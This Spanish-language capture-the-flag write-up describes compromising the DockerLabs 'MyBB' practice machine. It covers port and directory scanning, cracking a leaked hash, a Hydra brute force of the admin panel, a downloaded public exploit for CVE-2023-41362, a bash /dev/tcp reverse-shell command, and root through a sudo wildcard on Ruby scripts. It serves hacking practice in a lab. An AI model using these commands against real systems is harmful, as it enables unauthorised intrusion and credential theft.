---
title: MyBB
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2024-12-14
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-mybb/mybb_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - fuzzing web
  - os command injection
  - misconfigurations
  - data leaks
  - password attacks
  - interactive tty
  - sudo abuse
  - cve
  - http
  - tcp
  - information gathering
  - web analysis
  - vulnerability exploitation
  - cve exploitation
  - lateral movement
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ ping -c 1 127.17.0.2 
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.162 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.162/0.162/0.162/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 127.17.0.2 -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 80/open/tcp//http///     Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ sudo nmap -sCV -vvv -p80 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: MyBB
```

---
## Web Analysis

Al visitar el servidor web, se presenta una página estática sin información relevante.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_10.png)

El botón "Ir al foro" redirige a un dominio personalizado. Para acceder correctamente, añado el dominio al archivo hosts en mi máquina.

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ echo '127.17.0.2\tmybb.dl\tpanel.mybb.dl' | sudo tee -a /etc/hosts
```

Me encuentro con el sistema de gestión de foros MyBulletinBoard.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_11.png)

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ whatweb panel.mybb.dl
http://panel.mybb.dl [200 OK] Apache[2.4.58], Cookies[mybb[lastactive],mybb[lastvisit],sid], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[sid], IP[127.17.0.2], JQuery[1823], PasswordField[quick_password], PoweredBy[--], Script[text/javascript], Title[Forums]
```

Realizo un escaneo de directorios con Dirsearch y descubro varios recursos, incluyendo un directorio llamado 'backup'.

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ dirsearch -u panel.mybb.dl -i 200
[20:58:51] 200 -  810B  - /admin/
[20:58:51] 200 -  810B  - /admin/index.php
[20:58:55] 200 -    3KB - /attachment.php
[20:58:55] 200 -  455B  - /backups/
[20:58:55] 200 -   67B  - /cache/
[20:58:55] 200 -    4KB - /calendar.php
[20:58:57] 200 -    4KB - /contact.php
[20:58:57] 200 -    0B  - /css.php
[20:58:58] 200 -    3KB - /editpost.php
[20:58:59] 200 -  109B  - /global.php
[20:59:00] 200 -    1KB - /htaccess.txt
[20:59:00] 200 -   67B  - /images/
[20:59:00] 200 -   67B  - /inc/
[20:59:00] 200 -    4KB - /index.php
[20:59:00] 200 -    4KB - /index.php/login/
[20:59:01] 200 -  529B  - /install/
[20:59:01] 200 -  529B  - /install/index.php?upgrade/
[20:59:01] 200 -   67B  - /jscripts/
[20:59:03] 200 -    5KB - /memberlist.php
[20:59:03] 200 -    0B  - /misc.php
[20:59:03] 200 -    4KB - /modcp.php
[20:59:04] 200 -    3KB - /newreply.php
[20:59:04] 200 -    3KB - /newthread.php
[20:59:04] 200 -    3KB - /online.php
[20:59:06] 200 -    3KB - /printthread.php
[20:59:06] 200 -    4KB - /private.php
[20:59:07] 200 -    4KB - /report.php
[20:59:07] 200 -    3KB - /reputation.php
[20:59:08] 200 -    4KB - /search.php
[20:59:08] 200 -    2KB - /server-status/
[20:59:08] 200 -    2KB - /server-status
[20:59:09] 200 -    3KB - /stats.php
[20:59:11] 200 -   67B  - /uploads/
[20:59:12] 200 -    4KB - /usercp.php 
```

Dentro de 'backup', encuentro un archivo llamado 'data', el cual contiene información sensible.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_12.png)

En el archivo 'data', aparecen dos usuarios 'admin' y 'alice' y un hash de contraseña asociado a 'alice'.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_13.png)

Extraigo el hash para intentar descifrarlo con Hashcat.

* alice:$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ echo '$2y$10$OwtjLEqBf9BFDtK8sSzJ5u.gR.tKYfYNmcWqIzQBbkv.pTgKX.pPi' > alice_hash.txt
```
```terminal
/home/kali/Documents/dockerlabs/mybb:-$ hashcat --show alice_hash.txt
The following 4 hash-modes match the structure of your input hash:

      # | Name                                               | Category
  ======+====================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                       | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                     | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                   | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512               | Forums, CMS, E-Commerce
```
```terminal
/home/kali/Documents/dockerlabs/mybb:-$ hashcat -a 0 -m 3200 alice_hash.txt /usr/share/wordlists/rockyou.txt
tinkerbell
```

El resultado es 'tinkerbell'. Sin embargo, esta contraseña no me permite acceder a ningún servicio.

* alice:tinkerbell

![](/assets/img/dockerlabs-writeup-mybb/mybb1_15.png)

---
## Vulnerability Exploitation

Con pocas opciones restantes, decido realizar un ataque de fuerza bruta sobre el usuario 'admin'. Para ello, intercepto la solicitud POST del panel de inicio de sesión.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_16.png)

Modifiqué esta solicitud cambiando el método de la petición a GET. El formato de la URL quedó como sigue:

```
GET /admin/index.php?username=admin&password=123&do=login
```

Utilizo la respuesta 'The username and password combination you entered is invalid.' como indicador para que Hydra pudiera identificar cuándo una combinación de credenciales es incorrecta.

![](/assets/img/dockerlabs-writeup-mybb/mybb1_17.png)

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ hydra -l admin -P /usr/share/wordlists/rockyou.txt panel.mybb.dl http-post-form "/admin/index.php:username=^USER^&password=^PASS^=login:The username and password combination you entered is invalid."
```

![](/assets/img/dockerlabs-writeup-mybb/mybb1_18.png)

Hydra genera varias contraseñas posibles. Después de probarlas manualmente, consigo acceder con las siguientes credenciales: `admin`:`babygirl`.

---
## CVE Exploitation

![](/assets/img/dockerlabs-writeup-mybb/mybb1_21.png)

Ya dentro del panel de administración, verifico la versión de MyBB instalada. Encuentro que esta versión es vulnerable a una inyección de código en usuarios con privilegios administrador. [CVE-2023-41362](https://nvd.nist.gov/vuln/detail/cve-2023-41362)

Descargo y ejecuto un exploit público para aprovechar esta vulnerabilidad.

<https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE>

```terminal
/home/kali/Documents/dockerlabs/mybb:-$ wget https://raw.githubusercontent.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE/refs/heads/main/exploit.py

/home/kali/Documents/dockerlabs/mybb:-$ python3 exploit.py http://panel.mybb.dl/ admin babygirl

/home/kali/Documents/dockerlabs/mybb:-$ nc -lnvp 1234
	listening on [any] 1234 ...

Enter Command> bash -c 'bash -i >& /dev/tcp/192.168.0.171/1234 0>&1'
```

![](/assets/img/dockerlabs-writeup-mybb/mybb1_22.png)

```
	...connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 56572

www-data@kali:/var/www/mybb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
www-data@kali:/$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
alice:x:1001:1001:,,,:/home/alice:/bin/bash
```
El usuario alice tiene un shell válido configurado en /bin/bash. Accedo al usuario utilizando la contraseña previamente descubierta.

```terminal
www-data@kali:/$ su alice
Password: tinkerbell
$
```

---
## Privilege Escalation

Realizo el tratamiento de la TTY.

```terminal
script /dev/null -c bash
Script started, output log file is '/dev/null'.
alice@kali:/var/www/mybb$ ^Z
zsh: suspended  nc -lnvp 1234

/home/kali/Documents/dockerlabs/mybb:/home/kali/Documents/dockerlabs/mybb:-$ stty raw -echo;fg
[1]  + continued  nc -lnvp 1234
                               reset
reset: unknown terminal type unknown
Terminal type? xterm

alice@kali:/var/www/mybb$ export TERM=xterm
alice@kali:/var/www/mybb$ export SHELL=bash
alice@kali:/var/www/mybb$ stty rows 42 columns 86
```
```terminal
alice@kali:~$ sudo -l
Matching Defaults entries for alice on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User alice may run the following commands on kali:
    (ALL : ALL) NOPASSWD: /home/alice/scripts/*.rb
```

El usuario alice puede ejecutar cualquier archivo Ruby ubicado en el directorio /home/alice/scripts/ con privilegios de superusuario y sin necesidad de proporcionar contraseña.

Aprovechando estos permisos, se creo un script en Ruby para invocar una shell con privilegios de root.

```terminal
alice@kali:~$ echo -e '#!/usr/bin/env ruby\n\nexec "/bin/sh"' > scripts/shell.rb
alice@kali:~$ chmod +x scripts/shell.rb
alice@kali:~$ sudo /home/alice/scripts/shell.rb
# id
uid=0(root) gid=0(root) groups=0(root)
```